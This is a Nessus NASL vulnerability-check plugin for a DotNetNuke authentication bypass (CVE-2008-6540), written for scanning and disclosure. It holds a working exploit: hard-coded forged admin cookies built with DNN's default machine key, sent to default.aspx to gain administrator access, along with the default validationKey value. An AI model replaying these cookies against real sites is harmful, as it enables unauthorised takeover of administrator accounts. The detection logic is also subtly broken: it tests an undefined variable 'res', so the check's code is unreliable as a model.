#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(31643);
  script_version("$Revision: 1.21 $");
  script_cvs_date("$Date: 2016/05/19 17:45:44 $");

  script_cve_id("CVE-2008-6540");
  script_bugtraq_id(28391);
  script_osvdb_id(43720);
  script_xref(name:"Secunia", value:"29488");
  script_xref(name:"EDB-ID", value:"31465");

  script_name(english:"DNN (DotNetNuke) Upgrade Process ValidationKey Generation Weakness Privilege Escalation");
  script_summary(english:"Tries to gain access as administrator.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an ASP.NET application that allows a
remote attacker to bypass authentication.");
 script_set_attribute(attribute:"description", value:
"The version of DNN installed on the remote host appears to be using a
default machine key, both 'ValidationKey' and 'DecryptionKey', for
authentication token encryption and validation. A remote attacker can
leverage this issue to bypass authentication and gain administrative
access to the affected application.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/489957");
  # https://web.archive.org/web/20080323170420/http://www.dotnetnuke.com/News/SecurityBulletins/SecurityBulletinno12/tabid/1148/Default.aspx
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?0f4a4279");
  script_set_attribute(attribute:"see_also", value:"http://www.dnnsoftware.com/Platform/Manage/Security-Bulletins");
  script_set_attribute(attribute:"solution", value:
"Check that the value for 'validationKey' in DNN's web.config file is
not set to 'F9D1A2D3E1D3E2F7B3D9F90FF3965ABDAC304902' and upgrade to
DNN version 4.8.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(264);

  script_set_attribute(attribute:"vuln_publication_date", value:"2008/03/14");
  script_set_attribute(attribute:"patch_publication_date", value:"2008/03/14");
  script_set_attribute(attribute:"plugin_publication_date", value:"2008/03/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:dotnetnuke:dotnetnuke");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("dotnetnuke_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/DNN");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "DNN";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, asp:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(qs:dir, port:port);
init_cookiejar();

# exploit
set_http_cookie(name: "portalroles", value: "CB14B7E2553D9F6259ECF746F2D77FD15B05C5A10D98225339D6E282EFEFB3DA90D0747CEE5FAF2E7605B598311BA3349D25C108FBCEC7A0141BE6CDA83F2896342FBA33FFD8CB18D9A8896F30182B9EEB47786AB9574F6F3EBD9ECF56C389B401BCF744224A869F4C23D5E4280ACC8E16A2113C0770317F3A741630C77BB073871BE3E1E8A6F67AC5F0AC0582925D690B1D777C0302E18E");
set_http_cookie(name: ".DOTNETNUKE", value: "6BBF011195DE71050782BD8E4A9B906F770FEDF87AE1FC32D31B27A14E2307BF986E438E06F4B28DD30706CB516290D5CE1513DD677E64A098F912E2F63E3BE3DDE63809B616F614");

r = http_send_recv3(
  method : 'GET',
  item   : dir + "/default.aspx",
  port   : port,
  exit_on_fail : TRUE
);

# There's a problem if...
if (
  # it's DotNetNuke and...
  '<!-- by DotNetNuke Corporation' >< r[2] &&
  # we're logged in as administrator
  '">Administrator Account</a>' >< r[2] &&
  '">Logout</a>' >< res
)
{
  if (report_verbosity > 0)
  {
    report =
      '\n' +
      'Nessus was able to gain access using the following request :\n' +
      '\n' +
      '\n' + http_last_sent_request() + '\n';
     security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
